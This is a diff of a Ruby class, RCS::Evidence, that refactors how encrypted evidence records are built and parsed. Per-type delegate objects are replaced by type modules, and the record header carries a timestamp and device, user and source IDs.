@@ -16,6 +16,10 @@ require 'rcs-common/evidence/info'
 module RCS
 
 class Evidence
+  
+  extend Crypt
+  include Crypt
+  
   attr_reader :size
   attr_reader :binary
   attr_reader :content
@@ -27,68 +31,41 @@ class Evidence
   def self.VERSION_ID
     2008121901
   end
-  
-  extend Crypt
-  include Crypt
-  
-  # TODO: improve handling of delegation, should generate exceptions on invalid id or symbols
-  def delegate_from_typeid(id)
-    begin
-      delegate_from_typesym RCS::Common::EVIDENCE_TYPES[id]
-    rescue Exception => e
-      return nil
-    end
-  end
-  
-  def delegate_from_typesym(type)
-    begin
-      eval("#{type.to_s.capitalize}Evidence").new
-    rescue Exception => e
-      return nil
-    end
-  end
-  
+
   def initialize(key, info = {})
     @key = key
-    @info = info
+    info.each do |k,v|
+      self.instance_variable_set("@#{k}", v)
+    end
     @version = Evidence.VERSION_ID
   end
   
-  def method_missing(method_sym, *arguments, &block)
-    if @info.has_key? method_sym
-      get_info method_sym
-    else
-      super
-    end
+  def extend_on_type(type)
+    extend RCS.const_get "#{type.to_s.capitalize}Evidence"
   end
   
-  def self.respond_to?(method_sym, include_private=false)
-    if @info.has_key? method_sym
-      true
-    else
-      super
-    end
-  end
-  
-  def get_info(sym)
-    return @info[sym]
+  def extend_on_typeid(id)
+    extend_on_type RCS::Common::EVIDENCE_TYPES[id]
   end
   
   def generate_header
     thigh, tlow = @timestamp.to_filetime
-    deviceid_utf16 = @info[:device_id].to_utf16le_binary
-    userid_utf16 = @info[:user_id].to_utf16le_binary
-    sourceid_utf16 = @info[:source_id].to_utf16le_binary
-    
-    tid = @delegate.type_id
-    additional_size = @delegate.additional_header.size
-    struct = [Evidence.VERSION_ID, tid, thigh, tlow, deviceid_utf16.size, userid_utf16.size, sourceid_utf16.size, additional_size]
-    header = struct.pack("I*")
+    deviceid_utf16 = @device_id.to_utf16le_binary
+    userid_utf16 = @user_id.to_utf16le_binary
+    sourceid_utf16 = @source_id.to_utf16le_binary
 
+    add_header = ''
+    if respond_to? :additional_header
+      add_header = additional_header
+    end
+    additional_size = add_header.size
+    struct = [Evidence.VERSION_ID, type_id, thigh, tlow, deviceid_utf16.size, userid_utf16.size, sourceid_utf16.size, additional_size]
+    header = struct.pack("I*")
+    
     header += deviceid_utf16
     header += userid_utf16
     header += sourceid_utf16
-    header += @delegate.additional_header
+    header += add_header
     
     return encrypt(header)
   end
@@ -104,7 +81,7 @@ class Evidence
     data += "a" * rest
     return aes_encrypt(data, @key, PAD_NOPAD)
   end
-
+  
   def decrypt(data)
     return aes_decrypt(data, @key, PAD_NOPAD)
   end
@@ -117,20 +94,21 @@ class Evidence
   def generate(type)
     @name =  SecureRandom.hex(16)
     @timestamp = Time.now.utc
+    @type = type
     
-    # create a delegate of the requested type
-    @delegate = delegate_from_typesym(type)
+    # extend class on requested type
+    extend_on_type @type
     
-    # generate header
+    # header
     @binary = append_data(generate_header)
     
-    # append data
-    chunks = @delegate.binary
-    chunks.each do | c |
-      @binary += append_data( encrypt(c), c.size )
+    # content
+    if respond_to? :generate_content
+      chunks = generate_content
+      chunks.each do | c |
+        @binary += append_data( encrypt(c), c.size )
+      end
     end
-    
-    @content = @delegate.content
     
     return self
   end
@@ -166,37 +144,34 @@ class Evidence
     header = decrypt( data.slice!(0 .. header_length - 1) )
     
     # check that version is correct
-    @info[:version] = header.slice!(0..3).unpack("I").shift
+    @version = header.slice!(0..3).unpack("I").shift
     return nil unless @version == Evidence.VERSION_ID
-
-    # issue the delegate depending on evidence type
+    
+    # extend class depending on evidence type
     type = header.slice!(0..3).unpack("I").shift
     begin
-      @info[:type] = RCS::Common::EVIDENCE_TYPES[type]
+      @type = RCS::Common::EVIDENCE_TYPES[type]
+      extend_on_typeid(type)
     rescue Exception => e
       return nil
     end
-    
-    @delegate = delegate_from_typeid(type)
-    return nil unless @delegate.nil? == false
-    
+
     high = header.slice!(0..3).unpack("I").shift
     low = header.slice!(0..3).unpack("I").shift
-    @info[:timestamp] = Time.from_filetime(high, low)
+    @timestamp = Time.from_filetime(high, low)
     
     deviceid_size = header.slice!(0..3).unpack("I").shift
     userid_size = header.slice!(0..3).unpack("I").shift
     sourceid_size = header.slice!(0..3).unpack("I").shift
     additional_size = header.slice!(0..3).unpack("I").shift
     
-    @info[:device_id] = header.slice!(0 .. deviceid_size - 1).force_encoding('UTF-16LE') unless deviceid_size == 0
-    @info[:user_id] = header.slice!(0 .. userid_size - 1).force_encoding('UTF-16LE') unless userid_size == 0
-    @info[:source_id] = header.slice!(0 .. sourceid_size - 1).force_encoding('UTF-16LE') unless sourceid_size == 0
+    @device_id = header.slice!(0 .. deviceid_size - 1).force_encoding('UTF-16LE') unless deviceid_size == 0
+    @user_id = header.slice!(0 .. userid_size - 1).force_encoding('UTF-16LE') unless userid_size == 0
+    @source_id = header.slice!(0 .. sourceid_size - 1).force_encoding('UTF-16LE') unless sourceid_size == 0
     additional_data = ''
     additional_data += header.slice!(0 .. additional_size - 1) unless additional_size == 0
     
-    @delegate.decode_additional_header(additional_data)
-    @info.update @delegate.info
+    decode_additional_header(additional_data) if respond_to? :decode_additional_header
     
     # split content to chunks
     chunks = []
@@ -207,7 +182,7 @@ class Evidence
     end
     
     begin
-      @content = @delegate.decode_content(chunks)
+      @content = decode_content(chunks) if respond_to? :decode_content
     rescue Exception => e
       return self
     end
